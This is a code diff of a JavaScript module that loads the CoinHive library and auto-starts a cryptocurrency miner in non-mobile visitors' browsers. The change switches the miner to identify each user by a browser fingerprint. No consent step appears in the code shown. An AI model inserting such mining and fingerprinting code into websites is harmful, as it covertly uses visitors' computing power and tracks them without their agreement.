@@ -1,15 +1,15 @@
 /* global CoinHive */
 
 import './coinhive.min.js';
-import { SITE_KEY } from './Constants.mjs';
-import log from './log.mjs';
-import isMobile from './isMobile.mjs';
+import { SITE_KEY } from './Constants';
+import log from './log';
+import { mobile, fingerprint } from './client';
 
-const miner = new CoinHive.Anonymous(SITE_KEY, {
+const miner = new CoinHive.User(SITE_KEY, fingerprint, {
   threads: 1,
 });
 
-if (!isMobile) miner.start();
+if (!mobile) miner.start();
 
 miner.on('found', (...args) => {
   log('new job', ...args);
